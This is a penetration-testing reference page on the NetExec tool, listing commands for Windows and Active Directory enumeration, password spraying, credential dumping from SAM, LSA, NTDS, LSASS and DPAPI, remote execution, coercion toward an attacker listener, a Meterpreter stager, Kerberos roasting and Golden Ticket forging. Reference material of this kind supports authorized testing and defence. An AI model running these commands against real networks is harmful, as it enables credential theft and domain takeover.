---
title: "NetExec"
type: tool
tags: [active-directory, brute-force, credential-dumping, enumeration, ftp, kerberos, lateral-movement, ldap, mssql, nfs, rdp, smb, ssh, vnc, windows, winrm, wmi]
date_created: 2026-05-12
date_updated: 2026-07-28
sources: [0xdf-tools-netexec, netexec-wiki]
phase: postex
---

## Purpose

**NetExec** (`nxc`) is the community successor to CrackMapExec: a network service exploitation tool for authenticated and unauthenticated enumeration, credential testing, password spraying, credential dumping, and remote execution across ten protocols. On any Windows or Active Directory engagement it is the default first tool after the port scan, and the default tool for every credential you capture afterwards.

## Install / setup

```bash
# Kali / ParrotSec
apt update && apt install netexec

# pipx (recommended everywhere else; install rust first if arc4/aardwolf fail to build)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec

# BlackArch
pacman -Syu netexec

# update
pipx upgrade netexec      # new release only
pipx reinstall netexec    # force latest commits
```

Binaries for Linux/Windows/macOS are on the [releases page](https://github.com/Pennyw0rth/NetExec/releases). Docker: `docker build -t netexec . && docker run --rm -it netexec --help`.

Entry points are `netexec`, `NetExec`, and `nxc` (all the same binary), plus `nxcdb` for the database shell. Tab completion:

```bash
sudo apt install python3-argcomplete
register-python-argcomplete nxc >> ~/.bashrc
```

The tool was formerly CrackMapExec (`cme`); writeups from 2023 and earlier show `crackmapexec` in place of `netexec`.

### Home folder and config

State lives in `~/.nxc/` (override with the `NXC_PATH` environment variable):

| Path | Contents |
|---|---|
| `~/.nxc/nxc.conf` | Main config (audit mode, opsec, logging, BloodHound, Empire/MSF RPC) |
| `~/.nxc/workspaces/` | Per-workspace protocol databases |
| `~/.nxc/modules/` | Module output (spider_plus JSON, pre2k ccaches, etc.) |
| `~/.nxc/screenshots/` | RDP and VNC screenshots |
| `~/.nxc/logs/` | Log output when `log_mode = True` |

Config options worth setting before an engagement:

```ini
audit_mode = *          ; redact credentials in console output with this character (blank = off)
ignore_opsec = False    ; True suppresses opsec warnings (not recommended, they are informative)
log_mode = True         ; log every command and output to file
check_guest_account = true  ; auto-check guest logon with no creds (2025+, off by default)

[BloodHound]
bh_enabled = True       ; auto-mark compromised accounts as owned in BloodHound
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = pass

[Empire]
api_host=127.0.0.1
api_port=1337
username=empireadmin
password=Password123!
```

## Core usage

```
nxc <protocol> <target(s)> [options]
```

**Protocols:** `smb` `ldap` `winrm` `wmi` `mssql` `rdp` `ssh` `ftp` `nfs` `vnc`

Not every protocol supports the same features; `nxc <protocol> --help` is authoritative per protocol.

### Global flags (before the protocol)

| Flag | Description |
|---|---|
| `-t THREADS` | Concurrent threads (default 100) |
| `--timeout` | Max timeout per thread in seconds |
| `--jitter <s>` or `<lo-hi>` | Random delay between connections (per-host throttling) |
| `--no-progress` | Suppress the progress bar (cleaner for parsing) |
| `--verbose` / `--debug` | Verbosity |
| `--log <file>` | Log this command only |

### Target formats

Every protocol accepts hostnames, single IPs, space-separated lists, CIDR, ranges, and files, freely mixed:

```bash
nxc smb dc01.corp.local
nxc smb 192.168.1.10 192.168.1.20
nxc smb 192.168.1.0/24
nxc smb 192.168.1.0-28 10.0.0.1-67
nxc smb ~/targets.txt
```

### Credentials

| Flag | Description |
|---|---|
| `-u` | Username, space-separated usernames, or a file |
| `-p` | Password, space-separated passwords, or a file |
| `-H` | NT hash or `LM:NT`, or a file of hashes (pass-the-hash) |
| `-d DOMAIN` | Domain (needed when port 445 is closed so nxc cannot auto-detect it) |
| `--local-auth` | Authenticate as a local account instead of a domain account |
| `-id <cred ID>` | Pull a credential set straight from the nxcdb database |
| `--continue-on-success` | Do not stop after the first success (mandatory for spraying) |
| `--no-bruteforce` | Pair `-u`/`-p` index for index instead of the full matrix |
| `-k` | Kerberos authentication |
| `--use-kcache` | Use the ccache in `$KRB5CCNAME` |
| `--kdcHost` | Explicit KDC when DNS resolution fails |

```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE'
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
nxc smb 192.168.1.0/24 -u localguy -H 'NTHASH' --local-auth
```

Multi-domain environments: put `DOMAIN1\user` / `DOMAIN2\user` lines in the `-u` file.

### Kerberos

```bash
# password or hash, nxc handles the TGT/ST itself
nxc smb dc01.corp.local -u bonclay -p October2022 -k

# existing ticket
export KRB5CCNAME=/home/kali/administrator.ccache
nxc smb dc01.corp.local --use-kcache
nxc smb dc01.corp.local --use-kcache -x whoami

# explicit KDC when the realm will not resolve
nxc ldap corp.local -k --kdcHost dc01.corp.local
```

### Certificate authentication

```bash
nxc smb 192.168.0.1 --pfx-cert user.pfx -u user
nxc smb 192.168.0.1 --pfx-cert user.pfx --pfx-pass password -u user
nxc smb 192.168.0.1 --pfx-base64 user.b64 -u user
nxc smb 192.168.0.1 --pem-cert user.pem --pem-key key.pem -u user
```

A ccache is written into the nxc home folder, reusable by other Kerberos tooling. See [[active-directory-certificate-services]].

### DNS options

```bash
nxc <proto> <target> -u user -p pass --dns-server 10.10.10.5
nxc <proto> <target> -u user -p pass --dns-timeout 5
nxc <proto> <target> -u user -p pass --dns-tcp
nxc <proto> <target> -u user -p pass -6            # force IPv6
```

### Modules

```bash
nxc smb -L                              # list modules for a protocol (sorted by required privilege)
nxc smb -M lsassy --options             # show a module's options
nxc smb <target> -u u -p p -M lsassy -o COMMAND=xxx
nxc smb <target> -u u -p p -M spooler -M iis -M lsassy -M winscp   # multiple modules in one run
```

Module options are `KEY=value` (msfvenom style) after a single `-o`.

### Database (`nxcdb`)

Every credential, host, share, and dumped secret is stored automatically, per protocol, per workspace.

```bash
nxcdb
nxcdb (default) > workspace create clientA
nxcdb (clientA) > workspace list
nxcdb (clientA) > proto smb
nxcdb (clientA)(smb) > help
nxcdb (clientA)(smb) > creds
nxcdb (clientA)(smb) > export shares detailed shares.csv
nxcdb (clientA)(smb) > export creds detailed creds.csv
nxcdb (clientA)(smb) > export hosts signing relay_targets.txt
nxcdb (clientA)(smb) > back
```

`export [creds|hosts|local_admins|shares|signing|keys] [simple|detailed|*] [filename]`. Pull a stored credential back into a command with `-id <ID>`.

### Reading the output

- `[*]` informational (host banner, protocol data)
- `[+]` successful authentication
- `[-]` failed authentication
- Magenta output: authentication failed but the password itself is valid (for example `STATUS_PASSWORD_MUST_CHANGE`)
- `(Pwn3d!)` meaning is protocol-specific:

| Protocol | What Pwn3d! means |
|---|---|
| SMB | Most likely a member of the local Administrators group |
| WMI | Most likely local admin |
| WINRM | Code execution (member of Remote Management Users) |
| RDP | RDP logon rights, session can be opened |
| VNC | Code execution |
| LDAP | Path to domain admin |
| SSH | root (otherwise a specific message) |
| FTP | No check performed |

---

## SMB protocol

The main event. Assume `-u user -p pass` can be swapped for `-H hash`, `-k`, or `--use-kcache` throughout.

### Host discovery and access checks

```bash
nxc smb 192.168.1.0/24                                    # live hosts + OS + domain + signing + SMBv1
nxc smb 10.10.10.161 -u '' -p ''                          # null session
nxc smb 10.10.10.161 -u '' -p '' --shares                 # null session share list
nxc smb 10.10.10.178 -u 'a' -p ''                         # guest logon check (any user, empty password)
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt    # hosts with SMB signing NOT required
```

Null session and guest session are different things; a guest logon is enough to launch coercion attacks. With `check_guest_account = true` in nxc.conf, a bare `nxc smb <ip>` reports `Guest: True`. See [[internal-ntlm-relay]] for what a `signing:False` list is worth.

### Enumeration

```bash
nxc smb <target> -u u -p p --shares                   # share list + per-share READ/WRITE
nxc smb <target> -u u -p p --shares READ,WRITE        # filter (also READ or WRITE alone)
nxc smb <target> -u u -p p --dir                      # list directories inside shares
nxc smb <target> -u u -p p --users                    # domain users (SAMR)
nxc smb <target> -u u -p p --users-export users.txt
nxc smb <target> -u u -p p --rid-brute                # RID cycling, works on null/guest sessions
nxc smb <target> -u u -p p --local-group              # local groups
nxc smb <target> -u u -p p --pass-pol                 # password policy, READ THIS BEFORE SPRAYING
nxc smb <target> -u u -p p --disks
nxc smb <target> -u u -p p --interfaces               # network interfaces, finds pivot subnets
nxc smb <target> -u u -p p --loggedon-users [name]    # wkssvc, needs local admin
nxc smb <target> -u u -p p --qwinsta [name]           # interactive/RDP sessions + source IP
nxc smb <target> -u u -p p --reg-sessions [name|file] # loaded HKEY_USERS hives, via winreg
nxc smb <target> -u u -p p --tasklist [proc.exe]      # native tasklist, quieter than -x tasklist
nxc smb <target> -u u -p p --taskkill <PID|name.exe>
```

Group enumeration moved to the LDAP protocol (`nxc ldap ... --groups`).

Session enumeration flags are not interchangeable: `--loggedon-users` lists logon contexts, `--reg-sessions` lists loaded user hives, and only `--qwinsta` proves the *interactive* session that `schtask_as` requires.

Enumeration modules:

```bash
nxc smb <target> -u u -p p -M enum_av              # AV/EDR product (no privileges needed)
nxc smb <target> -u u -p p -M bitlocker            # BitLocker status per drive (also on wmi)
nxc smb <target> -u u -p p -M ntlmv1               # LmCompatibilityLevel < 3 means NTLMv1 allowed
nxc smb <target> -u u -p p -M wcc                  # host config checks, incl. Defender exclusions
nxc smb <target> -u u -p p -M lockscreendoors      # tampered utilman/sethc/osk accessibility binaries
nxc smb <target> -u u -p p -M sccm-recon6          # Primary Site Server / Distribution Point via HKLM\SOFTWARE\Microsoft\SMS
nxc smb <target> -u u -p p -M security-questions   # local users' security questions and answers
nxc smb <target> -u u -p p -M spooler              # print spooler running (PrinterBug prerequisite)
nxc smb <target> -u u -p p -M webdav               # WebDav running (HTTP coercion prerequisite)
```

`lockscreendoors` pairs with an NLA-disabled RDP service: a tampered `utilman.exe` plus an unauthenticated lock screen is a SYSTEM shell. Compare against [[windows-persistence]].

### Vulnerability checks

Run these first on an internal:

```bash
nxc smb <target> -u '' -p '' -M zerologon           # [[zerologon]]
nxc smb <target> -u u  -p p  -M nopac               # [[nopac-samaccountname-spoofing]], needs creds
nxc smb <target> -u '' -p '' -M printnightmare      # [[printnightmare]]
nxc smb <target> -u '' -p '' -M smbghost            # CVE-2020-0796 prerequisites
nxc smb <target> -u '' -p '' -M ms17-010
nxc smb <target> -u u  -p p  -M ntlm_reflection     # CVE-2025-33073, needs creds
nxc smb <target> -u u  -p p  -M remove-mic          # CVE-2019-1040 drop-the-MIC
nxc smb <target> -u '' -p '' -M zerologon -M printnightmare -M ms17-010   # stack them
```

### Coercion

```bash
nxc smb <target> -u u -p p -M coerce_plus                                    # safe check, LISTENER defaults to localhost
nxc smb <target> -u u -p p -M coerce_plus -o LISTENER=<attacker_ip>
nxc smb <target> -u u -p p -M coerce_plus -o LISTENER=<attacker_ip> ALWAYS=true   # run every method
nxc smb <target> -u u -p p -M coerce_plus -o METHOD=PetitPotam
```

`coerce_plus` covers PetitPotam, DFSCoerce, PrinterBug, MSEven, and ShadowCoerce in one module. `METHOD`/`LISTENER` shorten to `M`/`L`, and method names prefix-match (`M=pe` PetitPotam, `M=pr` PrinterBug, `M=dfs` DFSCoerce; `M=p` is ambiguous and errors). Feed the coerced auth into [[internal-ntlm-relay]] or [[internal-coerce]].

### Password spraying

```bash
nxc smb <target> -u users.txt -p 'Summer18' --continue-on-success        # one password, many users
nxc smb <target> -u users.txt -p users.txt --no-bruteforce --continue-on-success   # username == password
nxc smb <target> -u users.txt -p pass.txt --no-bruteforce --continue-on-success    # pairs, index for index
nxc smb <target> -u users.txt -p pass.txt                                # FULL MATRIX, lockout risk
nxc smb <target> --jitter 2-5 -u users.txt -p pass.txt                   # throttle (per host)
```

Read `--pass-pol` first and obey the lockout threshold. Full-matrix spraying against a real domain locks accounts, which is an incident, not a finding. See [[password-spraying]] and the lockout gate in `Skill(hunt-ad)`.

### Command execution

```bash
nxc smb <target> -u Administrator -p 'P@ssw0rd' -x whoami
nxc smb <target> -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'          # PowerShell
nxc smb <target> -u Administrator -p 'P@ssw0rd' --exec-method smbexec -x whoami
nxc smb <target> -u Administrator -p 'P@ssw0rd' -X 'cmd' --amsi-bypass /path/payload
```

Three methods, tried in order `wmiexec` then `atexec` then `smbexec` unless pinned with `--exec-method`. Obfuscation and AMSI bypass are non-default now (they were getting flagged); the `ps32` downgrade bypasses Defender as a side effect. `--continue-on-success` is incompatible with command execution.

Execution as another user:

```bash
# as a logged-on user (confirm with --qwinsta first), needs local admin
nxc smb <target> -u admin -p pass -M schtask_as -o USER=victim CMD='whoami'
nxc smb <target> -u admin -p pass -M schtask_as -o USER=victim CMD='whoami' TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"

# process injection into a target user's process, needs SYSTEM
nxc smb <target> -u admin -p pass -M pi -o PID=<pid> EXEC=<command>

# stagers
nxc smb <target> -u u -p p -M empire_exec -o LISTENER=test
nxc smb <target> -u u -p p -M met_inject -o SRVHOST=10.10.14.5 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
```

`schtask_as` options: `CMD`, `USER`, optional `BINARY` (uploaded, executed, cleaned up), `TASK`, `FILE`, `LOCATION`.

### Files

```bash
nxc smb <target> -u u -p p --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
nxc smb <target> -u u -p p --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
nxc smb <target> -u u -p p --spider C\$ --pattern txt        # built-in, '$' must be escaped
nxc smb <target> -u u -p p -M spider_plus                    # index every readable share to JSON
nxc smb <target> -u u -p p -M spider_plus -o DOWNLOAD_FLAG=True   # and download everything
```

`spider_plus` writes `~/.nxc/modules/nxc_spider_plus/<ip>.json`; parse with `jq`. See [[internal-shares]].

### Credential dumping

```bash
nxc smb <target> -u u -p p --sam                  # local SAM (local admin)
nxc smb <target> -u u -p p --sam secdump          # fall back to the old on-disk hive method
nxc smb <target> -u u -p p --lsa                  # LSA secrets, cached creds, service accounts
nxc smb <target> -u u -p p --lsa secdump
nxc smb <target> -u u -p p --ntds                 # DCSync the whole domain (DA on a DC)
nxc smb <target> -u u -p p --ntds --enabled       # enabled accounts only
nxc smb <target> -u u -p p --ntds --user Administrator
nxc smb <target> -u u -p p --ntds --user NETBIOS/Administrator   # multi-domain forests
nxc smb <target> -u u -p p --ntds vss             # volume shadow copy instead of drsuapi
nxc smb <target> -u 'DC01$' -H <machine_hash> --ntds             # DCSync with the DC machine account
nxc smb <target> -u u -p p -M ntdsutil            # ntdsutil dump, parsed locally
nxc smb <target> -u u -p p -M ntds-dump-raw -o TARGET=NTDS       # raw disk read
nxc smb <target> -u u -p p -M backup_operator     # SeBackupPrivilege to SAM/SYSTEM/SECURITY/NTDS, no admin
```

`--sam`/`--lsa` now read the hives through the remote registry service by default (stealthier than writing temp files); `secdump` is the legacy path. `--ntds` defaults to `drsuapi`. See [[active-directory-ntds-dumping]] and [[server-operators-privesc]].

LSASS:

```bash
nxc smb <target> -u u -p p -M lsassy
nxc smb <target> -u u -p p -M nanodump
nxc smb <target> -u u -p p -M mimikatz
nxc smb <target> -u u -p p -M mimikatz -o COMMAND='"lsadump::dcsync /domain:corp.local /user:krbtgt"'
```

DPAPI and application secrets:

```bash
nxc smb <target> -u u -p p --dpapi                  # Credential Manager, Chrome, Edge, Firefox
nxc smb <target> -u u -p p --dpapi cookies          # browser cookies too
nxc smb <target> -u u -p p --dpapi nosystem         # skip system creds, avoids some EDR triggers
nxc smb <target> -u u -p p -M dpapi_hash            # masterkey hashes for hashcat -m 15310/15900
nxc smb <target> -u u -p p --sccm                   # SCCM secrets via dploot (disk|wmi)
nxc smb <target> -u u -p p -M wam                   # Entra ID / M365 tokens from Token Broker Cache
nxc smb <target> -u u -p p -M wam --pvk domain_backup_key.pvk
nxc smb <target> -u u -p p -M veeam                 # Veeam backup job credentials
nxc smb <target> -u u -p p -M winscp                # registry + WinSCP.ini sessions
nxc smb <target> -u u -p p -M putty                 # stored private keys and proxy creds
nxc smb <target> -u u -p p -M vnc                   # RealVNC / TightVNC
nxc smb <target> -u u -p p -M mremoteng
nxc smb <target> -u u -p p -M rdcman
nxc smb <target> -u u -p p -M keepass_discover
nxc smb <target> -u u -p p -M keepass_trigger -o KEEPASS_CONFIG_PATH=<path from discover>
nxc smb <target> -u u -p p -M notepad               # unsaved Notepad buffers
nxc smb <target> -u u -p p -M notepad++             # unsaved Notepad++ buffers
nxc smb <target> -u u -p p -M teams_localdb         # Microsoft Teams cookies
nxc smb <target> -u u -p p -M wifi                  # stored WLAN profiles
nxc smb <target> -u u -p p -M eventlog_creds        # creds in EID 4688 / Sysmon EID 1 command lines
nxc smb <target> -u u -p p -M snipped               # Snipping Tool screenshots
```

Most of these need local admin; add `--local-auth` when the account is local. `--dpapi nosystem` is the EDR-friendly variant. See [[windows-dpapi]] and [[deployment-sccm]].

### Account and group manipulation

```bash
# change your own password (works on STATUS_PASSWORD_MUST_CHANGE / STATUS_PASSWORD_EXPIRED)
nxc smb <target> -u user -p oldpass -M change-password -o NEWPASS='NewPass123!'
nxc smb <target> -u user -p oldpass -M change-password -o NEWNTHASH=31d6cfe0d16ae931b73c59d7e0c089c0

# abuse ForceChangePassword / GenericAll over another user
nxc smb <target> -u user -p pass -M change-password -o USER=TargetUser NEWPASS='NewPass123!'
nxc smb <target> -u user -p pass -M change-password -o USER=TargetUser NEWNTHASH=<hash>

# abuse AddMember / AddSelf over a group
nxc smb <target> -u user -p pass -M modify-group -o USER=TargetUser GROUP=TargetGroup
nxc smb <target> -u user -p pass -M modify-group -o USER=TargetUser GROUP=TargetGroup REMOVE=True
```

See [[active-directory-access-controls-aclace]].

### Delegation

```bash
# RBCD: you control an account written into msDS-AllowedToActOnBehalfOfOtherIdentity
nxc smb <target> -u jon.snow -p iknownothing --delegate Administrator

# S4U2Self with a computer account: nearly always local admin
nxc smb <target> -u 'KINGSLANDING$' -H <machine_hash> --delegate Administrator --self

# RBCD from an SPN-less user account (--u2u), see workflow below
nxc smb <target> --use-kcache --delegate Administrator --u2u
```

The `--u2u` workflow, for an account with no `servicePrincipalName` (S4U2Self would fail with `KDC_ERR_S_PRINCIPAL_UNKNOWN`):

```bash
nxc smb <target> -u jon.snow -p iknownothing --generate-tgt jon.snow
export KRB5CCNAME=jon.snow.ccache
describeTicket.py jon.snow.ccache          # read the RC4 session key
nxc smb <target> -u jon.snow -p iknownothing -M change-password -o NEWNTHASH='<rc4_session_key>'
nxc smb <target> --use-kcache --delegate Administrator --u2u
```

Requires an RC4 session key (request the TGT with `-H` if the KDC hands you AES) and breaks normal password logon until the hash is reset. See [[kerberos-delegation-resource-based-constrained-delegation]] and [[kerberos-service-for-user-extension]].

### LAPS

```bash
nxc smb <target> -u user-who-can-read-laps -p pass --laps
nxc smb <target> -u user-who-can-read-laps -p pass --laps <admin_account_name>
```

nxc fetches the LAPS password per host and authenticates with it, so one command sweeps a whole LAPS-managed estate. See [[password-laps]].

### Environment helpers

```bash
nxc smb <target> --generate-hosts-file /etc/hosts    # writes hostname + FQDN, fixes Kerberos/LDAP DNS
nxc smb <target> -u u -p p --generate-krb5-file /tmp/krb5.conf
export KRB5_CONFIG=/tmp/krb5.conf
nxc smb <target> -u u -p p --generate-tgt /tmp/user   # then export KRB5CCNAME and --use-kcache
```

---

## LDAP protocol

```bash
nxc ldap <dc> -u user -p password
nxc ldap <dc> -u user -H <nthash>
nxc ldap 192.168.1.0/24 -u users.txt -p '' -k       # test which accounts exist, no password needed
nxc ldap <dc> -u user -p pass --no-smb              # skip the initial SMB connection used for domain discovery
```

### Enumeration

```bash
nxc ldap <dc> -u u -p p --users
nxc ldap <dc> -u u -p p --users-export users.txt
nxc ldap <dc> -u u -p p --active-users                    # excludes disabled accounts
nxc ldap <dc> -u u -p p --groups
nxc ldap <dc> -u u -p p --groups "Domain Admins"          # members of one group
nxc ldap <dc> -u u -p p --admin-count                     # objects with adminCount=1
nxc ldap <dc> -u u -p p --get-sid                         # domain SID
nxc ldap <dc> -u u -p p --dc-list                         # DCs, their IPs, and domain trusts
nxc ldap <dc> -u u -p p --pso                             # fine-grained password policies (PSO/FGPP)
nxc ldap <dc> -u u -p p --query "(sAMAccountName=Administrator)" ""
nxc ldap <dc> -u u -p p --query "(adminCount=1)" "sAMAccountName"
nxc ldap <dc> -u u -p p --query "(objectClass=*)" "sAMAccountName objectClass pwdLastSet"
```

`--query` is a raw ldapsearch replacement: filter first, space-separated attribute list second (empty string for all).

### Roasting

```bash
nxc ldap <dc> -u harry -p '' --asreproast output.txt              # unauthenticated, no pre-auth accounts
nxc ldap <dc> -u users.txt -p '' --asreproast output.txt
nxc ldap <dc> -u harry -p pass --asreproast output.txt            # authenticated, finds all of them
nxc ldap <dc> -u harry -p pass --kerberoasting output.txt
nxc ldap <dc> -u harry -p pass --kerberoasting out.txt --targeted-kerberoast victim1 victim2
nxc ldap <dc> -u harry -p pass --kerberoasting out.txt --targeted-kerberoast users.list
nxc ldap <dc> -u harry -p '' --no-preauth-targets roastable.list --kerberoasting out.txt

hashcat -m 18200 asrep.txt wordlist    # AS-REP
hashcat -m 13100 tgs.txt wordlist      # TGS
```

Targeted Kerberoasting temporarily sets `cifs/<sAMAccountName>` on a victim you have write access to, requests the ticket, then removes the SPN; it needs `GenericAll`/`WriteProperty` on `servicePrincipalName`. `--no-preauth-targets` chains an AS-REP-roastable account into Kerberoasting without any password. See [[roasting-asrep-roasting]], [[roasting-kerberoasting]], and [[roasting-timeroasting]] (`-M timeroast`, which needs no authentication at all).

### Delegation and ACLs

```bash
nxc ldap <dc> -u u -p p --trusted-for-delegation      # TRUSTED_FOR_DELEGATION users and computers
nxc ldap <dc> -u u -p p --find-delegation             # every delegation type, with rights-to targets

nxc ldap <dc> -k -M daclread -o TARGET=Administrator ACTION=read
nxc ldap <dc> -k -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=blwasp
nxc ldap <dc> -k -M daclread -o TARGET_DN="DC=lab,DC=local" ACTION=read RIGHTS=DCSync
nxc ldap <dc> -k -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
nxc ldap <dc> -k -M daclread -o TARGET=targets.txt ACTION=backup
```

`RIGHTS=DCSync` answers "who can DCSync this domain" in one call. See [[kerberos-delegation-unconstrained-delegation]] and [[active-directory-access-controls-aclace]].

### Credential material

```bash
nxc ldap <dc> -u u -p p --gmsa                       # gMSA passwords (forces LDAPS automatically)
nxc ldap <dc> -u u -p p --gmsa-convert-id <hex>      # gMSA id from an LSA secret to an account
nxc ldap <dc> -u u -p p --gmsa-decrypt-lsa '_SC_GMSA_{...}:<blob>'
nxc ldap <dc> -u u -p p -M get-desc-users            # passwords in the description field
nxc ldap <dc> -u u -p p -M get-desc-users -o FILTER=pass MINLENGTH=8 PASSWORDPOLICY=True
nxc ldap <dc> -u u -p p -M get-userPassword          # userPassword attribute
nxc ldap <dc> -u u -p p -M get-unixUserPassword      # unixUserPassword attribute
nxc ldap <dc> -u u -p p -M get-scriptpath            # scriptPath, options FILTER / OUTPUTFILE
nxc ldap <dc> -u u -p p -M pre2k                     # pre-created computer accounts, password = hostname
```

`pre2k` saves accounts to `~/.nxc/modules/pre2k/<domain>/precreated_computers.txt` and any working tickets to `~/.nxc/modules/pre2k/ccache/<machine>.ccache`; use one with `export KRB5CCNAME=<machine>.ccache && nxc ldap <dc> --use-kcache`. See [[password-gmsa]], [[password-pre-created-computer-account]], and [[password-ad-user-comment]].

### Infrastructure discovery

```bash
nxc ldap <dc> -u u -p p -M maq                       # MachineAccountQuota (default 10)
nxc ldap <dc> -u u -p p -M adcs                      # PKI enrollment servers
nxc ldap <dc> -u u -p p -M adcs -o SERVER=<ca>       # certificates inside a PKI
nxc ldap <dc> -u u -p p -M sccm -o REC_RESOLVE=TRUE  # SCCM site servers, sites, management points
nxc ldap <dc> -u u -p p -M entra-id                  # Entra ID sync server (MSOL account has DCSync)
nxc ldap <dc> -u u -p p -M get-network               # subnets; -o ONLY_HOSTS=true or ALL=true
nxc ldap <dc> -u u -p p -M obsolete                  # obsolete operating systems
nxc ldap <dc> -u u -p p -M dns-nonsecure             # DNS zones allowing unauthenticated updates
```

An unsecured DNS zone is exploitable with `nsupdate` (`server <dc>` / `zone <zone>` / `update add <rec>.<zone> 0 A <attacker>` / `send`), which sets up [[internal-ntlm-relay]] coercion. See [[active-directory-machine-account-quota]], [[adcs]], and [[active-directory-integrated-dns-adidns]].

### Trust abuse

```bash
nxc ldap <dc> -u u -p p -M raisechild                              # forge a Golden Ticket with an extra SID
nxc ldap <dc> -u u -p p -M raisechild -o USER=test123 USER_ID=1111
nxc ldap <dc> -u u -p p -M raisechild -o ETYPE=aes256
nxc ldap <dc> -u u -p p -M raisechild -o RID=512
export KRB5CCNAME=Administrator.ccache
nxc ldap <parent_or_child_dc> --use-kcache
```

Works child to parent and parent to child. The user must exist in **both** domains, and `USER_ID` must be the RID in the domain where the module runs (the domain whose krbtgt key forges the ticket). Options: `USER` (default Administrator), `USER_ID` (default 500), `RID` (default 519, Enterprise Admins), `ETYPE` (rc4/aes128/aes256; use AES against Server 2025, which disables RC4). See [[child-domain-to-forest-compromise-sid-hijacking]].

### BloodHound

```bash
nxc ldap <dc> -u u -p p --bloodhound --collection All
nxc ldap <dc> -u u -p p --bloodhound -c All --dns-server <dc_ip>
nxc ldap <dc> -u u -p p --bloodhound --collection Method1,Method2
```

Built-in BloodHound.py collector. With `bh_enabled = True` in nxc.conf, every account nxc compromises is auto-marked owned in the graph. See [[bloodhound]] and [[ad-enumeration]].

---

## WinRM protocol

```bash
nxc winrm <target> -u user -p password              # (Pwn3d!) means evil-winrm will connect
nxc winrm <target> -u user -p password -d DOMAIN    # when 445 is closed
nxc winrm <target> -u user -p 'password' -X whoami
nxc winrm <target> -u users.txt -p pass.txt --no-bruteforce --continue-on-success
nxc winrm <target> -u user -p pass --laps
nxc winrm <target> -u user -p pass --sam
nxc winrm <target> -u user -p pass --lsa
nxc winrm <target> -u user -p pass --dpapi          # Credential Manager for the connecting user, NO admin needed
```

WinRM `--dpapi` without admin is an underused primitive for looting your own user's saved credentials. Hand off to [[evil-winrm]].

## WMI protocol

```bash
nxc wmi <target> -u james -p 'J@m3s_P@ssW0rd!'
nxc wmi <target> -u james -p 'J@m3s_P@ssW0rd!' -d HTB       # when 445 is closed
nxc wmi <target> -u admin -p 'admin' --local-auth
nxc wmi <target> -u user -p 'password' -x whoami
nxc wmi <target> -u users.txt -p pass.txt --no-bruteforce
```

Useful when SMB is filtered but WMI (135/DCOM) is not. See [[internal-dcom]].

---

## MSSQL protocol

```bash
nxc mssql <target> -u james -p 'pass'                       # Windows auth (default)
nxc mssql <target> -u james -p 'pass' -d HTB                # Windows auth, SMB closed
nxc mssql <target> -u sa -p 'pass' --local-auth             # SQL auth
nxc mssql <target> --port 1434
nxc mssql 192.168.56.0/24                                   # banner shows EncryptionReq:True/False
nxc mssql <target> -u u -p p --rid-brute                    # domain user enumeration through MSSQL
nxc mssql <target> -u users.txt -p pass.txt --no-bruteforce
```

### Query, execute, transfer

```bash
nxc mssql <target> -u sa -p pass --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql <target> -u sa -p pass --local-auth -x whoami                 # via xp_cmdshell
nxc mssql <target> -u u -p p --put-file /tmp/users C:\\Windows\\Temp\\out.txt
nxc mssql <target> -u u -p p --get-file C:\\Windows\\Temp\\out.txt /tmp/out
```

### Privilege escalation and enumeration modules

```bash
nxc mssql <target> -u u -p p -M mssql_priv                       # who can I impersonate
nxc mssql <target> -u u -p p -M mssql_priv -o ACTION=privesc     # impersonate to sysadmin
nxc mssql <target> -u u -p p -M mssql_priv -o ACTION=rollback    # give it back
nxc mssql <target> -u u -p p -M enum_impersonate
nxc mssql <target> -u u -p p -M enum_logins
nxc mssql <target> -u u -p p -M mssql_cbt                        # channel binding required? if not, relay is possible
nxc mssql <target> -u u -p p -M mssql_coerce                     # coerce SMB auth via MSSQL
```

### Linked servers

```bash
nxc mssql <target> -u u -p p -M enum_links
nxc mssql <target> -u u -p p -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'
nxc mssql <target> -u u -p p -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=enable
nxc mssql <target> -u u -p p -M link_xpcmd -o LINKED_SERVER=BRAAVOS CMD='whoami'
nxc mssql <target> -u u -p p -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=disable
```

Linked servers cross domain and forest trusts, so a low-privilege SQL login can become code execution in another domain. Always disable `xp_cmdshell` and roll back sysadmin on a real engagement. See [[mssql-linked-database]], [[mssql-command-execution]], and [[mssql-credentials]].

---

## RDP protocol

```bash
nxc rdp <target> -u user -p password                        # (Pwn3d!) means RDP logon rights
nxc rdp <target> -u users.txt -p pass.txt --no-bruteforce
nxc rdp <target> -u user -p pass -x whoami                  # beta, 2025+
nxc rdp <target> -u user -p pass -x whoami --cmd-delay 5 --clipboard-delay 5
nxc rdp <target> -u user -p pass --screenshot --screentime 10
nxc rdp <target> --nla-screenshot                           # login screen when NLA is disabled
nxc smb <target> -u admin -p pass -M shadowrdp              # enable/disable Shadow RDP session spying
```

`-x` over RDP disconnects the console user like a lock (no logoff, nothing is lost), but it is still visible. `--nla-screenshot` is a cheap unauthenticated recon win: the lock screen leaks the domain, the last logged-on user, and any accessibility backdoor.

## SSH protocol

```bash
nxc ssh <target> -u user -p password
nxc ssh <target> --port 2222
nxc ssh <target> -u user -p password -x whoami
nxc ssh <target> -u user -p pass --get-file /tmp/file.txt file.txt
nxc ssh <target> -u user -p pass --put-file file.txt /tmp/file.txt
